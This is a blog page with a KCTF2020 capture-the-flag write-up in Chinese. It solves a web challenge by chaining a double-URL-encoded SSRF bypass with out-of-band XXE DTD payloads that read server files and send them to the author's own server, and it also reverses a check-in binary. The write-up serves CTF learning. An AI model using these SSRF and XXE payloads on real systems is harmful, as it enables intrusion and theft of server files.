<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="author" content="Boringboys">
	
	<link rel="icon" href="/imgs/headpic-lingmeng.png">
    
	
    <meta name="description" content="我的博客">
    
    
    
    
    
    
    <title>KCTF2020 WriteUp | Auwaves</title>
    <link href="https://www.auwaves.com" rel="prefetch" />

    
<link rel="stylesheet" href="/css/bootstrap.min.css">
<link rel="stylesheet" href="/css/aos.css">
<link rel="stylesheet" href="/css/style.css">

    
<script src="/js/jquery.min.js"></script>

    
<script src="/js/bootstrap.min.js"></script>

    
<script src="/js/aos.js"></script>

    
<script src="/js/highslide/highslide-full.min.js"></script>

    
<link rel="stylesheet" href="/js/highslide/highslide.css">

    <style type="text/css">
        @media (max-width: 768px) {
            body {
                background-color: #f0f0f0;
                background: url('/imgs/xsbg.gif');
                background-attachment: fixed;
            }
        }
    </style>
    
    <!--<script type="text/javascript">
      if (document.images) {
        var avatar = new Image();
        avatar.src = '/imgs/headpic-lingmeng.png'
        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg,preview5.jpg'.split(',')
        var previewsPreLoad = []
        for(var i = 0; i < length; i++) {
          previewsPreLoad.push(new Image())
          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
        }
      }
    </script>-->
<meta name="generator" content="Hexo 4.2.1"></head>
<body>
    <!-- 背景轮播图功能 -->
    <section class="hidden-xs">
    <ul class="cb-slideshow">
        <li><span>少看书</span></li>
        <li><span>少看书</span></li>
        <li><span>少看</span></li>
        <li><span>那些</span></li>
        <li><span>没用</span></li>
        <li><span>的书</span></li>
    </ul>
</section>
    <!-- 欧尼酱功能, 谁用谁知道 -->
    
    <div class="gal-menu gal-dropdown">
    <div class="circle" id="gal">
        <div class="ring">
            <a href="https://www.auwaves.com" class="menuItem" style="left: 50%; top: 15%;">首页</a>
            
            <a class="menuItem" style="left: 80.3109%; top: 32.5%;">下一页</a>
            
			
			<a class="menuItem" style="left: 80.3109%; top: 67.5%;" id="next-song">下一曲</a>
            <a class="menuItem" style="left: 50%; top: 85%;" id="play-or-pause" title="双击停止">播放</a>
            <a class="menuItem" style="left: 19.6891%; top: 67.5%;" id="pre-song">上一曲</a>
			
			<!--
            <a href="/archives" class="menuItem" style="left: 80.3109%; top: 67.5%;">归档</a>
            <a href="/about" class="menuItem" style="left: 50%; top: 85%;">关于</a>
            <a href="/message" class="menuItem" style="left: 19.6891%; top: 67.5%;">留言板</a>
			-->
			
            
            <a class="menuItem" style="left: 19.6891%; top: 32.5%;">上一页</a>
            
			
			<a class="menuItemMid" style="left: 43.45%; top: 43.45%;" id="middle-btn">	
				<p id="mid-fullname-text">无</p>
				<p id="playermode-text">顺序播放</p>
			</a>
        </div>
        <audio id="audio" src="/imgs/oni.mp3"></audio>
		<audio id="musicplayer" src="/imgs/oni.mp3"></audio>
    </div>
</div>
    
    <header class="navbar navbar-inverse" id="gal-header">
    <div class="container">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed"
                    data-toggle="collapse" data-target=".bs-navbar-collapse"
                    aria-expanded="false">
                <span class="fa fa-lg fa-reorder"></span>
            </button>
            <a href="https://www.auwaves.com">
                
                <style>
                    #gal-header .navbar-brand {
                        height: 54px;
                        line-height: 24px;
                        font-size: 28px;
                        opacity: 1;
                        background-color: rgba(0,0,0,0);
                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
                    }
                </style>
                <!-- 这里使用文字(navbar_text or config.title) -->
                <div class="navbar-brand">Auwaves</div>
                
            </a>
        </div>
        <div class="collapse navbar-collapse bs-navbar-collapse">
            <ul class="nav navbar-nav" id="menu-gal">
                
                
                <li class="">
                    <a href="/">
                        <i class="fa fa-home"></i>首页
                    </a>
                </li>
                
                
                
                <li class="">
                    <a href="/archives">
                        <i class="fa fa-archive"></i>归档
                    </a>
                </li>
                
                
                
                
                <li class="dropdown">
                    <!-- TODO 添加hover dropdown效果 -->
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
                        <i class="fa fa-list"></i>分类
                    </a>
                    <ul class="dropdown-menu">
                        
                        
                        <li>
                            <a href="/categories/%E6%9D%82%E9%A1%B9/">杂项</a>
                        </li>
                        
                        <li>
                            <a href="/categories/CTF/">CTF</a>
                        </li>
                        
                        <li>
                            <a href="/categories/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/">工具安装</a>
                        </li>
                        
                        
                        <li>
                            <a href="/categories">...</a>
                        </li>
                        
                        
                    </ul>
                </li>
                
                
                
                
                
                <li class="dropdown">
                    <!-- TODO 添加hover dropdown效果 -->
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
                        <i class="fa fa-tags"></i>标签
                    </a>
                    <ul class="dropdown-menu">
                        
                        
                        <li>
                            <a href="/tags/%E5%BB%B6%E8%BF%9F%E9%80%80%E4%BC%91/">延迟退休</a>
                        </li>
                        
                        <li>
                            <a href="/tags/%E7%A6%BB%E5%A9%9A%E5%86%B7%E9%9D%99/">离婚冷静</a>
                        </li>
                        
                        <li>
                            <a href="/tags/%E6%81%B6%E6%84%8F%E8%BF%94%E4%B9%A1/">恶意返乡</a>
                        </li>
                        
                        
                        <li>
                            <a href="/tags">...</a>
                        </li>
                        
                        
                    </ul>
                </li>
                
                
                
                
                <li class="">
                    <a href="/about">
                        <i class="fa fa-user"></i>关于我
                    </a>
                </li>
                
                
            </ul>
        </div>
    </div>
</header>
    <div id="gal-body">
        <div class="container">
            <div class="row">
                <div class="col-md-8 gal-right" id="mainstay">
                    
<article class="article well article-body" id="article">
    <div class="breadcrumb">
        <i class="fa fa-home"></i>
        <a href="https://www.auwaves.com">Auwaves</a>
        >
        <span>KCTF2020 WriteUp</span>
    </div>
    <!-- 大型设备详细文章 -->
    <div class="hidden-xs">
        <div class="title-article">
            <h1>
                <a href="/2020/11/20/KCTF2020%20WriteUp/">KCTF2020 WriteUp</a>
            </h1>
        </div>
        <div class="tag-article">
            
            <span class="label label-gal">
                <i class="fa fa-tags"></i>
                
                <a href="/tags/WEB/">WEB</a>, 
                
                <a href="/tags/CTF/">CTF</a>, 
                
                <a href="/tags/%E9%80%86%E5%90%91/">逆向</a>
                
            </span>
            
            <span class="label label-gal">
                <i class="fa fa-calendar"></i> 2020-11-20
            </span>
            
        </div>
    </div>
    <!-- 小型设备详细文章 -->
    <div class="visible-xs">
        <center>
            <div class="title-article">
                <h4>
                    <a href="/2020/11/20/KCTF2020%20WriteUp/">KCTF2020 WriteUp</a>
                </h4>
            </div>
            <p>
                <i class="fa fa-calendar"></i> 2020-11-20
            </p>
            <p>
                
                <i class="fa fa-tags"></i>
                
                <a href="/tags/WEB/">WEB</a>, 
                
                <a href="/tags/CTF/">CTF</a>, 
                
                <a href="/tags/%E9%80%86%E5%90%91/">逆向</a>
                
                
                
            </p>
        </center>
    </div>
    <div class="content-article">
        <h2 id="第一题-至暗时刻"><a href="#第一题-至暗时刻" class="headerlink" title="第一题 至暗时刻"></a>第一题 至暗时刻</h2><a id="more"></a>

<p>题目描述：</p>
<p>一道Web题，访问链接：</p>
<p><a href="http://121.36.145.157:8088/" target="_blank" rel="noopener">http://121.36.145.157:8088/</a></p>
<p>利用技术绕过限制，获得flag.txt文件中的值。</p>
<p>访问页面，是一张图片，查看页面源代码：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic1.png" alt=" "></p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;UTF-8&quot;&gt;
&lt;title&gt;test&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;img src=&quot;/getimage?url=https://bbs.pediy.com/upload/attach/202009/236762_Y76C73KQC7MG83G.jpg&quot;&gt;
&lt;!--测试加载配置文件 /loadConfig?url=x.xml--&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><p>发现一个被注释掉的url:  </p>
<pre><code>http://121.36.145.157:8088/loadConfig?url=x.xml  </code></pre><p>看样子貌似可以访问指定的url<br>但访问页面返回<code>not allow ip</code>，IP不被允许：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic2.png" alt=" ">  </p>
<p>尝试 <code>X-Forwarded-For</code> 伪造客户端IP<br>抓包到burp中，爆破了一些内网ip都显示<code>not allow ip</code>:  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic3.png" alt=" ">  </p>
<p>仅192.168端就有60000多个ip，显然也不会是爆破去做-_-|</p>
<p>回顾前面的网页源码发现另一个用来加载图片的链接：  </p>
<pre><code>http://121.36.145.157:8088/getimage?url=https://bbs.pediy.com/upload/attach/202009/236762_Y76C73KQC7MG83G.jpg</code></pre><p>是访问指定的url获取资源的，尝试修改url参数，返回如下的正则表达式：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic4.png" alt=" ">  </p>
<pre><code>illegal url! ^(http|https):\\/\\/[^?#\\/]*\\.pediy\\.com\\/.*</code></pre><p>应该是要想办法绕过这个正则，访问指定的url<br>这个正则要求url是如下格式：  </p>
<pre><code>http://{1}.pediy.com/{2}
或
https://{1}.pediy.com/{2}</code></pre><p>{1}处不允许出现’？’，’#’，’/‘字符<br>{2}处可以是任意内容</p>
<p>直接用’#’无法通过正则：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic5.png" alt=" "> </p>
<p>尝试进行URL编码，还是不能通过正则：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic6.png" alt=" "> </p>
<p>换其它符号试试，发现在做正则检查前会进行一次URL解码：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic7.png" alt=" "></p>
<p>尝试进行两次URL编码绕过：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic8.png" alt=" "></p>
<p>绕过成功，已经尝试去访问 <code>https://127.0.0.1</code> 了  </p>
<p>在自己的vps起了web服务，用这个ssrf去访问，企图获得真实IP，然后用这个IP去利用第一个接口：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic9.png" alt=" "></p>
<p>这里注意到，我的web是起在5000端口的，但直接输 <code>http://ip:port</code> 的形式会报错 <code>invalid port number</code>  </p>
<p>所以’:’也要两次URL编码，访问成功，但是在我的vps获得的IP是 <code>121.36.145.157</code> :  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic10.png" alt=" "></p>
<p>这不就是题目地这么，拿去 <code>/loadConfig?url=x.xml</code> 那里尝试，依然是 <code>not allow ip</code> ，行不通  </p>
<p>又尝试ssrf <code>http://127.0.0.1:8088/loadConfig?url=x.xml</code> 这个url，构造请求：  </p>
<pre><code>http://121.36.145.157:8088/getimage?url=http://127.0.0.1%253a8088%2523.pediy.com/loadConfig?url=x.xml</code></pre><p>返回结果，访问成功： </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic11.png" alt=" "></p>
<p>发到burp中继续尝试：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic12.png" alt=" "></p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic13.png" alt=" "></p>
<p>发现会从 <code>/loadConfig?url=x.xml</code> 指定的位置读取文件并当作XML来解析，猜测XXE漏洞  </p>
<p>在自己的vps上放了以下payload：  </p>
<pre><code>=================================================================================
&lt;!-- t.dtd --&gt;
&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE r [
&lt;!ELEMENT r ANY &gt;
&lt;!ENTITY sp SYSTEM &quot;file:///etc/issue&quot;&gt;
]&gt;
&lt;r&gt;&amp;sp;&lt;/r&gt;
=================================================================================</code></pre><p>构造请求：  </p>
<pre><code>/getimage?url=http://127.0.0.1%253a8088%2523.pediy.com/loadConfig?url=http://{my_vps_ip}:5000/t.dtd</code></pre><p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic14.png" alt=" "></p>
<p>没有正常回显内容，尝试用FTP协议把内容发送出来，payload:  </p>
<pre><code>=================================================================================
&lt;!-- c.dtd --&gt;
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE r [
&lt;!ENTITY % data3 SYSTEM &quot;file:///etc/issue&quot;&gt;
&lt;!ENTITY % sp SYSTEM &quot;http://my_vps_ip:5000/d.dtd&quot;&gt;
%sp;
%param3;
%exfil;
]&gt;
=================================================================================
&lt;!-- d.dtd --&gt;
&lt;!ENTITY % param3 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &apos;ftp://my_vps_ip:30000/%data3;&apos;&gt;&quot;&gt;
=================================================================================</code></pre><p>并在vps的30000端口上起了ftp服务，脚本：<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb" target="_blank" rel="noopener">https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb</a>  </p>
<p>构造请求：  </p>
<pre><code>/getimage?url=http://127.0.0.1%253a8088%2523.pediy.com/loadConfig?url=http://my_vps_ip:5000/c.dtd</code></pre><p>在vps上接收到内容 <code>/etc/issue</code> 文件的内容：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic15.png" alt=" "></p>
<p>但是尝试读含有特殊字符的文件时，就无法正常发送数据到vps:  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic16.png" alt=" "></p>
<p>而且没法查看目录，没办法找flag<br>之后又用netdoc协议试试，可以列目录，最终使用以下payload：  </p>
<pre><code>=================================================================================
&lt;!-- g.dtd --&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE creds [
&lt;!ENTITY % data3 SYSTEM &quot;netdoc:///&quot;&gt;
&lt;!ENTITY % sp SYSTEM &quot;http://my_vps_ip:5000/d.dtd&quot;&gt;
%sp;
%param3;
%exfil;n
]&gt;
=================================================================================
&lt;!-- d.dtd --&gt;
&lt;!ENTITY % param3 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &apos;netdoc://my_vps_ip:80/%data3;&apos;&gt;&quot;&gt;
=================================================================================</code></pre><p>构造请求：  </p>
<pre><code>/getimage?url=http://127.0.0.1%253a8088%2523.pediy.com/loadConfig?url=http://my_vps_ip:5000/g.dtd</code></pre><p>在burp中可以回显，已经可以列目录，读文件了：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic17.png" alt=" "><br><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic18.png" alt=" "></p>
<p>之后就是列目录，看文件。。。</p>
<p>最后在/home下有一些jar包：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic19.png" alt=" ">  </p>
<p>用jar:file：读jar包，尝试了spring jar包常见的路径</p>
<p>最后找到flag.txt的路径是 <code>vip-demo-0.0.1-SNAPSHOT.jar</code>包下的 <code>/BOOT-INF/classes/flag.txt</code>，payload：  </p>
<pre><code>=================================================================================
&lt;!-- g.dtd --&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE creds [
&lt;!ENTITY % data3 SYSTEM &quot;jar:file:///home/vip-demo-0.0.1-SNAPSHOT.jar!/BOOT-INF/classes/flag.txt&quot;&gt;
&lt;!ENTITY % sp SYSTEM &quot;http://{my_vps_ip}:5000/d.dtd&quot;&gt;
%sp;
%param3;
%exfil;n
]&gt;
=================================================================================
&lt;!-- d.dtd --&gt;
&lt;!ENTITY % param3 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &apos;netdoc://101.37.76.66:80/%data3;&apos;&gt;&quot;&gt;
=================================================================================</code></pre><p>获得flag截图：</p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic20.png" alt=" "></p>
<p>获得的flag是 <code>flag{congratulations-Path-the-spring-boot}</code></p>
<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><!--more-->

<p>目标程序执行如下：<br><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-CheckIn-WP/pic1.png" alt="pic1"><br>需要输入正确的flag  </p>
<p>直接在IDA Pro中打开 F5查看<br><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-CheckIn-WP/pic2.png" alt="pic2"><br>分析代码：  </p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
char *v3; // rdx
signed __int64 v4; // rcx
int *v5; // r8
__int64 v6; // rax
char v7; // dl
char v8; // cl
char v9; // cl
int v11; // [rsp+20h] [rbp-E0h]
__int16 v12; // [rsp+24h] [rbp-DCh]
char Dst; // [rsp+30h] [rbp-D0h]
char v14; // [rsp+31h] [rbp-CFh]
char v15; // [rsp+32h] [rbp-CEh]
char v16; // [rsp+33h] [rbp-CDh]
char v17; // [rsp+34h] [rbp-CCh]
int v18; // [rsp+35h] [rbp-CBh]
__int16 v19; // [rsp+39h] [rbp-C7h]
char v20; // [rsp+3Bh] [rbp-C5h]
char v21; // [rsp+130h] [rbp+30h]
char v22; // [rsp+131h] [rbp+31h]
char v23; // [rsp+132h] [rbp+32h]
char v24; // [rsp+133h] [rbp+33h]
char v25; // [rsp+134h] [rbp+34h]
char v26; // [rsp+135h] [rbp+35h]

memset(&amp;Dst, 0, 0x100ui64);
memset(&amp;v21, 0, 0x100ui64);
sub_140001250((__int64)&quot;KCTF 2020!\n&quot;);
sub_140001250((__int64)&quot;http://bbs.pediy.com\n&quot;);
sub_140001250((__int64)&quot;Please input your flag: &quot;);
sub_1400011E0((__int64)&quot;%s&quot;, &amp;Dst, 256i64);
v3 = &amp;Dst;
v4 = -1i64;
do
    ++v4;
while ( *(&amp;Dst + v4) );
if ( (_DWORD)v4 == 12 &amp;&amp; Dst == 102 &amp;&amp; v14 == 108 &amp;&amp; v15 == 97 &amp;&amp; v16 == 103 &amp;&amp; v17 == 123 &amp;&amp; v20 == 125 )
{
    v5 = &amp;v11;
    v6 = 0i64;
    v12 = v19;
    v3 = 0i64;
    v11 = v18;
    while ( (unsigned __int8)(*(_BYTE *)v5 - 48) &lt;= 9u )
    {
    v3 = (char *)(unsigned int)((_DWORD)v3 + 1);
    v5 = (int *)((char *)v5 + 1);
    if ( (unsigned int)v3 &gt;= 6 )
    {
        v21 = v18;
        v7 = v18 + BYTE1(v18) - 48 + BYTE2(v18) - 48;
        v22 = v18 + BYTE1(v18) - 48;
        v23 = v7;
        v8 = v7 + HIBYTE(v18) - 48;
        v3 = &amp;v21;
        v24 = v8;
        v25 = v8 + v19 - 48;
        v26 = v25 + HIBYTE(v19) - 48;
        while ( 1 )
        {
        v9 = *(&amp;v21 + v6++);
        if ( v9 != a2Efi[v6 - 1] )
            break;
        if ( v6 == 7 )
        {
            sub_140001250((__int64)&quot;You are winner!\n&quot;, &amp;v21, &quot;2;=EFI&quot;);
            return 0;
        }
        }
        break;
    }
    }
}
sub_140001250((__int64)&quot;Try again!\n&quot;, v3);
return -1;
}</code></pre><hr>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-CheckIn-WP/pic3.png" alt="pic3">  </p>
<p>输入的字符串从Dst处开始存放  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-CheckIn-WP/pic7.png" alt="pic7">  </p>
<p>首先会做以下判断：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-CheckIn-WP/pic4.png" alt="pic4">  </p>
<p>查询ASCII码，DST、v14、v15、v16、v17和v20处对应的字符分别应该是<br>‘f’、’l’、’a’、’g’、’{‘和’}’  </p>
<p>然后会继续做以下判断：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-CheckIn-WP/pic5.png" alt="pic5">  </p>
<p>从v21往后的字符要分别等于a2Efi中的字符，</p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-CheckIn-WP/pic8.png" alt="pic8">  </p>
<p>看到对应的字符是2;=EFI  </p>
<p>ASCII码分别是 50 59 61 69 70 73  </p>
<p>要比较六个字符，列出以下对应关系：  </p>
<pre><code>v21 = 50  
v22 = 59  
v23 = 61  
v24 = 69  
v25 = 70  
v26 = 73  </code></pre><p>观察这六个变量的值是如何取得：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-CheckIn-WP/pic6.png" alt="pic6">  </p>
<p>发现是根据v18和v19的值决定的<br>从上面定义处可以发现v18是一个int型变量，所以占4个字节，四个字节中的值分别设为A、B、C、D<br>v19是一个16位的int型，占2个字节，值分别设为E、F  </p>
<pre><code>BYTE1(v18) 取v18的第二个字节 B
BYTE2(v18) 取v18的第三个字节 C
HIBYTE(v18) 取v18最高位的一个字节 D
HIBYTE(v19) 取v19最高位的一个字节 F
v18 和 v19 在存放到一个字节的内存时，高位字节丢失，分别取最低位A和E</code></pre><p>所以根据上图，列出以下关系式：  </p>
<pre><code>50 = v21 = A  
59 = v22 = A + B - 48  
61 = v23 = A + B - 48 + C - 48   
69 = v24 = A + B - 48 + C - 48 + D - 48  
70 = v25 = A + B - 48 + C - 48 + D - 48 + E - 48  
73 = v26 = A + B - 48 + C - 48 + D - 48 + E - 48 + F - 48  </code></pre><p>得到结果：</p>
<pre><code>A = 50  
B = 57
C = 50
D = 56
E = 49
F = 51</code></pre><p>对应的字符分别是：2、9、2、8、1、3<br>所以得到最终结果就是：flag{292813}</p>
<blockquote>
<p>作者：Boringboys<br>原文链接：<a href="https://www.boringboys.top/2020/11/20/KCTF2020第一题WP/" target="_blank" rel="noopener">https://www.boringboys.top/2020/11/20/KCTF2020第一题WP/</a><br>版权声明：本文采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">BY-NC-SA</a>协议授权，转载请遵守此协议</p>
</blockquote>

    </div>
</article>


                </div>
                <aside class="col-md-4 gal-left" id="sidebar">
    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
<aside id="sidebar-search">
    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
        <form class="form-inline clearfix" id="search-form" method="get"
              action="/search/index.html">
            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~" autocomplete="off">
            <button class="btn btn-danger btn-gal" type="submit">
                <i class="fa fa-search"></i>
            </button>
        </form>
    </div>
</aside>
    <aside id="sidebar-author">
    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
        <div class="panel-heading" style="text-align: center">
            <i class="fa fa-quote-left"></i>
            Boringboys
            <i class="fa fa-quote-right"></i>
        </div>
        <div class="author-panel text-center">
            <img src="/imgs/headpic-lingmeng.png" width="140" height="140"
                 alt="个人头像" class="author-image">
            <p class="author-description"><p>我的博客</p>
</p>
        </div>
    </div>
</aside>
    
    <aside id="sidebar-recent_comments">
    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
        <div class="panel-heading">
            <i class="fa fa-comments"></i>
            最新评论
            <i class="fa fa-times-circle panel-remove"></i>
            <i class="fa fa-chevron-circle-up panel-toggle"></i>
        </div>
        <ul class="list-group list-group-flush"></ul>
    </div>
</aside>
    
    <!-- 要配置好leancloud才能开启此小工具 -->
    
    
    <aside id="sidebar-recent_posts">
    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
        <div class="panel-heading">
            <i class="fa fa-refresh"></i>
            近期文章
            <i class="fa fa-times-circle panel-remove"></i>
            <i class="fa fa-chevron-circle-up panel-toggle"></i>
        </div>
        <ul class="list-group list-group-flush">
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2021/07/25/Windows%20Terminal%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96/">Windows Terminal安装和美化</a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2021/01/16/%E5%AF%B9linux%E7%AE%A1%E9%81%93%E5%92%8Cgrep%EF%BC%8Cxrags%E7%9A%84%E5%AD%A6%E4%B9%A0/">对linux管道和grep，xrags的学习</a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2020/11/20/KCTF2020%20WriteUp/">KCTF2020 WriteUp</a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2018/12/04/%E5%AF%86%E7%A0%81%E5%AD%A6Diffie-Hellman%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E5%8D%8F%E8%AE%AE/">密码学 Diffie-Hellman密钥交换协议</a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/1899/11/30/Hello_World/">Hello World?</a>
                </span>
            </li>
            
        </ul>
    </div>
</aside>
    
    
    <aside id="sidebar-rand_posts">
    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
        <div class="panel-heading">
            <i class="fa fa-refresh"></i>
            随机文章
            <i class="fa fa-times-circle panel-remove"></i>
            <i class="fa fa-chevron-circle-up panel-toggle"></i>
        </div>
        <ul class="list-group list-group-flush">
            
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/1899/11/30/Hello_World/">Hello World?</a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2020/11/20/KCTF2020%20WriteUp/">KCTF2020 WriteUp</a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2021/07/25/Windows%20Terminal%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96/">Windows Terminal安装和美化</a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2018/12/04/%E5%AF%86%E7%A0%81%E5%AD%A6Diffie-Hellman%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E5%8D%8F%E8%AE%AE/">密码学 Diffie-Hellman密钥交换协议</a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2021/01/16/%E5%AF%B9linux%E7%AE%A1%E9%81%93%E5%92%8Cgrep%EF%BC%8Cxrags%E7%9A%84%E5%AD%A6%E4%B9%A0/">对linux管道和grep，xrags的学习</a>
                </span>
            </li>
            
        </ul>
    </div>
</aside>
    
    
    <aside id="gal-sets">
        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
            <ul class="nav nav-pills pills-gal">

                
                <li>
                    <a href="/2020/11/20/KCTF2020%20WriteUp/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
                </li>
                
                
                <li>
                    <a href="/2020/11/20/KCTF2020%20WriteUp/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
                </li>
                
                
                <li>
                    <a href="/2020/11/20/KCTF2020%20WriteUp/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                </li>
                
            </ul>
            <div class="tab-content">
                
                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
    
    <a href="/tags/%E5%BB%B6%E8%BF%9F%E9%80%80%E4%BC%91/" style="font-size: 11.268667118333884px;" class="tag-cloud-link">延迟退休</a>
    
    <a href="/tags/%E7%A6%BB%E5%A9%9A%E5%86%B7%E9%9D%99/" style="font-size: 10.317792361755368px;" class="tag-cloud-link">离婚冷静</a>
    
    <a href="/tags/%E6%81%B6%E6%84%8F%E8%BF%94%E4%B9%A1/" style="font-size: 17.788407289026544px;" class="tag-cloud-link">恶意返乡</a>
    
    <a href="/tags/%E5%BC%82%E5%B8%B8%E7%BB%B4%E6%9D%83/" style="font-size: 14.897002860001905px;" class="tag-cloud-link">异常维权</a>
    
    <a href="/tags/WEB/" style="font-size: 18.508636913410484px;" class="tag-cloud-link">WEB</a>
    
    <a href="/tags/CTF/" style="font-size: 10.586160563765068px;" class="tag-cloud-link">CTF</a>
    
    <a href="/tags/%E9%80%86%E5%90%91/" style="font-size: 8.170280691120062px;" class="tag-cloud-link">逆向</a>
    
    <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 19.99745482654722px;" class="tag-cloud-link">工具</a>
    
    <a href="/tags/Windows-Terminal/" style="font-size: 17.634111682867083px;" class="tag-cloud-link">Windows Terminal</a>
    
    <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 8.028262899823169px;" class="tag-cloud-link">安全</a>
    
    <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 12.450015894765926px;" class="tag-cloud-link">学习</a>
    
    <a href="/tags/grep/" style="font-size: 11.35580268064976px;" class="tag-cloud-link">grep</a>
    
